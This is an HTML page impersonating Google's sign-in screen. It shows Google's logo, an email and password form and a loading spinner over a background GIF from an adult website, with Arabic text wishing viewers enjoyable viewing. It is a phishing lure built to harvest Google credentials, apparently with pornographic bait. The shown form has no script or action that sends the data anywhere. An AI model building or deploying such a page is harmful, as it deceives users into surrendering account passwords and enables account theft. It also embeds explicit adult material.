<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign in – Google</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&family=Cairo:wght@700&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    html, body {
      width: 100%;
      height: 100%;
      font-family: 'Roboto', sans-serif;
      overflow: hidden;
      background: transparent;
    }
    .background {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -1;
    }
    .background img {
      width: 100%;
      height: 100%;
      object-fit: fill;
    }
    .animated-text {
      position: fixed;
      top: 20px;
      left: 50%;
      transform: translateX(-50%);
      font-size: 28px;
      font-family: 'Cairo', sans-serif;
      font-weight: bold;
      background: linear-gradient(90deg, #ff6ec4, #7873f5, #42e695, #ff6ec4);
      background-size: 800% 800%;
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      animation: animatedGradient 8s linear infinite;
      letter-spacing: 1px;
      white-space: nowrap;
      z-index: 10;
    }
    @keyframes animatedGradient {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    .container {
      position: absolute;
      top: 55%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: rgba(0, 0, 0, 0.4);
      border-radius: 20px;
      padding: 40px 30px;
      width: 360px;
      color: #fff;
      box-shadow: 0 0 25px rgba(0, 0, 0, 0.4);
    }
    .logo {
      display: flex;
      justify-content: center;
      margin-bottom: 20px;
    }
    .logo img {
      width: 90px;
    }
    h2 {
      font-size: 24px;
      text-align: center;
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: none;
      border-radius: 8px;
      background: rgba(255, 255, 255, 0.25);
      color: #fff;
      font-size: 15px;
      outline: none;
    }
    input::placeholder {
      color: #ddd;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #1a73e8;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 10px;
      transition: background 0.3s;
    }
    button:hover {
      background-color: #0f5ec7;
    }
    .spinner {
      display: none;
      justify-content: center;
      align-items: center;
      margin-top: 15px;
    }
    .spinner div {
      width: 20px;
      height: 20px;
      border: 3px solid #fff;
      border-top: 3px solid transparent;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="background">
    <img src="https://www.newarabsex.com/wp-content/uploads/2019/02/%D8%A8%D9%88%D8%B3-%D8%A8%D9%86%D8%A7%D8%AA-%D9%85%D8%AB%D9%84%D9%8A%D8%A9.gif" alt="Background" />
  </div>  <div class="animated-text">نتمنى لكم مشاهدة ممتعة</div>  <div class="container">
    <div class="logo">
      <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
    </div>
    <h2>Sign in</h2>
    <form id="loginForm">
      <input type="email" id="email" placeholder="Email or phone" required>
      <input type="password" id="password" placeholder="Enter your password (min 6 chars)" required>
      <button type="submit">تسجيل الدخول</button>
      <div class="spinner" id="spinner"><div></div></div>
    </form>
  </div>
</body>
</html>
